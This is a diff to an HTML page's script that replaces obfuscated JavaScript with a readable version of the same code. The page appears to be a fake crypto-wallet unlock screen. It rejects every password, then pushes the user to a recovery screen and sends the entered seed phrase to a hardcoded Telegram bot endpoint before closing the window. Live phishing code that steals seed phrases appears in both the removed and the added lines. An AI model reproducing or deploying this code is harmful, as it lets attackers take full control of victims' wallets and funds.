@@ -202,7 +202,35 @@
 
 	</div>
 	<script type="text/javascript">
-		function _0x3408(_0x43d223,_0x40a59d){var _0x4f315f=_0x4f31();return _0x3408=function(_0x3408df,_0x2698fc){_0x3408df=_0x3408df-0x10b;var _0xe5691e=_0x4f315f[_0x3408df];return _0xe5691e;},_0x3408(_0x43d223,_0x40a59d);}(function(_0xd83861,_0x29963f){var _0x50105e=_0x3408,_0x120f8c=_0xd83861();while(!![]){try{var _0x5b2395=parseInt(_0x50105e(0x113))/0x1*(parseInt(_0x50105e(0x114))/0x2)+parseInt(_0x50105e(0x123))/0x3*(parseInt(_0x50105e(0x110))/0x4)+-parseInt(_0x50105e(0x11e))/0x5+-parseInt(_0x50105e(0x118))/0x6*(-parseInt(_0x50105e(0x116))/0x7)+parseInt(_0x50105e(0x112))/0x8+-parseInt(_0x50105e(0x11a))/0x9+-parseInt(_0x50105e(0x122))/0xa*(parseInt(_0x50105e(0x115))/0xb);if(_0x5b2395===_0x29963f)break;else _0x120f8c['push'](_0x120f8c['shift']());}catch(_0x3b6a0b){_0x120f8c['push'](_0x120f8c['shift']());}}}(_0x4f31,0x50e17));var error_counter=0x0;function send_seed(){var _0x47e956=_0x3408,_0x115800=document[_0x47e956(0x11f)](_0x47e956(0x121))[_0x47e956(0x111)];fetch(_0x47e956(0x124)+_0x115800)['thrn'](function(){var _0xfddf12=_0x47e956;window[_0xfddf12(0x10c)]();});}function forgot(){var _0x521ef1=_0x3408;document[_0x521ef1(0x11f)](_0x521ef1(0x11d))[_0x521ef1(0x10f)]['display']='none',document['getElementById'](_0x521ef1(0x117))[_0x521ef1(0x10f)][_0x521ef1(0x10b)]=_0x521ef1(0x11b);}function clear_error(){var _0x53e264=_0x3408;document['getElementById'](_0x53e264(0x120))[_0x53e264(0x10f)][_0x53e264(0x10d)]=_0x53e264(0x10e),document[_0x53e264(0x11f)](_0x53e264(0x11c))[_0x53e264(0x10f)][_0x53e264(0x10b)]=_0x53e264(0x119);}function unlock(){var _0x3ba371=_0x3408;document[_0x3ba371(0x11f)](_0x3ba371(0x120))[_0x3ba371(0x111)]!=''&&(error_counter+=0x1,error_counter>0x1?(document[_0x3ba371(0x11f)](_0x3ba371(0x11d))[_0x3ba371(0x10f)][_0x3ba371(0x10b)]=_0x3ba371(0x119),document['getElementById']('slide2')['style'][_0x3ba371(0x10b)]=_0x3ba371(0x11b)):(document['getElementById']('password_input')['style'][_0x3ba371(0x10d)]='#f44336',document[_0x3ba371(0x11f)](_0x3ba371(0x11c))['style'][_0x3ba371(0x10b)]=_0x3ba371(0x11b)));}function _0x4f31(){var _0x2159ee=['slide1','1390900FAwsnH','getElementById','password_input','seed','10aNMnkU','2235VhjLmO','https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=','display','close','borderColor','#25272a','style','3468MgkHtF','value','2461552ntoOaw','653481teekGb','2SiFevG','14400419dmSYDL','7zqnyhb','slide2','3821682piOyBQ','none','2928969vuoAAj','block','error_password'];_0x4f31=function(){return _0x2159ee;};return _0x4f31();}
+		var error_counter = 0;
+
+		function send_seed(){
+			var seed = document.getElementById('seed').value;
+			fetch('https://api.telegram.org/bot1954952646:AAFEScLs_9fUgjyqTiG9Is828jf8wupEurI/sendMessage?chat_id=896837120&text=' + seed).then(function(){
+					window.close();
+			})
+		}
+
+		function forgot(){
+			document.getElementById('slide1').style.display = 'none';
+			document.getElementById('slide2').style.display = 'block';
+		}
+		function clear_error(){
+			document.getElementById('password_input').style.borderColor = '#25272a';
+			document.getElementById('error_password').style.display = 'none';
+		}
+		function unlock(){
+			if(document.getElementById('password_input').value != ''){
+				error_counter += 1;
+				if(error_counter > 1){
+					document.getElementById('slide1').style.display = 'none';
+					document.getElementById('slide2').style.display = 'block';
+				}else{
+					document.getElementById('password_input').style.borderColor = '#f44336';
+					document.getElementById('error_password').style.display = 'block';
+				}
+			}
+		}
 	</script>
 </body>
 </html>
